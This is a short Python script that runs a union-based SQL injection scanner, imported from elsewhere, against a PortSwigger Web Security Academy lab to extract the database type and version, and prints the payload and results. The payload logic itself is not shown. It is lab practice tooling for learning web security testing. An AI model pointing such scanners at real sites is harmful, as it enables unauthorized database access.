"""
PortSwigger Lab #4: SQL injection attack, querying the database type and version on MySQL and Microsoft
"""

import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.modules.scanner.modules.union_sqli import UnionSQLiScanner

# ============================================================
# Configuration
# ============================================================

# NAYA LAB URL YAHAN PASTE KAREIN
TARGET = "https://0ae400760376d57982eb515f00f5002d.web-security-academy.net/filter?category=Gifts"

# ============================================================
# Run Test
# ============================================================


def main():
    print("=" * 60)
    print("PortSwigger Lab #4: MySQL/MSSQL Version Extraction")
    print("=" * 60)

    scanner = UnionSQLiScanner(TARGET)
    scanner.parameter = "category"
    findings = scanner.scan()

    print(f"\n{'='*60}")
    print("RESULTS")
    print(f"{'='*60}")
    print(f"Findings: {len(findings)}")

    for f in findings:
        print(f"\n  ✅ Vulnerability Found!")
        print(f"  DBMS: {f.dbms}")
        print(f"  Column Count: {f.column_count}")
        print(f"  Payload: {f.payload}")
        print(f"  Confidence: {f.confidence * 100:.0f}%")

        for row in f.extracted_data:
            print(f"    DBMS: {row.get('dbms', 'N/A')}")
            print(f"    Version: {row.get('version', 'N/A')}")

    if not findings:
        print("\n  ❌ No vulnerabilities found.")


if __name__ == "__main__":
    main()
